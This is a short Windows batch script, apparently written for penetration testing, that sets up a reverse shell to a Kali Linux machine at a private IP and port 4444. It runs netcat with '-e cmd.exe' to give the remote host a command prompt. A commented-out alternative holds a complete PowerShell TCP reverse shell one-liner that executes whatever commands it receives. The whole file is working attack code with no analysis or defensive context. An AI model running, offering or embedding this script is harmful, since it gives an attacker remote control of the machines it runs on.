@echo off
:: Batch script to create a reverse shell to Kali Linux IP (192.168.0.141)

:: Specify the target IP and port
set TARGET_IP=192.168.0.141
set TARGET_PORT=4444

:: Use Netcat (nc) to create a reverse shell connection
:: You need to ensure that nc.exe is available on the target machine
nc.exe %TARGET_IP% %TARGET_PORT% -e cmd.exe

:: Or if you are using PowerShell to create a reverse shell (works without nc)
:: Powershell reverse shell
:: powershell -NoP -NonI -Command "$client = New-Object System.Net.Sockets.TCPClient('%TARGET_IP%',%TARGET_PORT%);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {$data = (New-Object Text.Encoding.ASCII).GetString($bytes, 0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"

pause
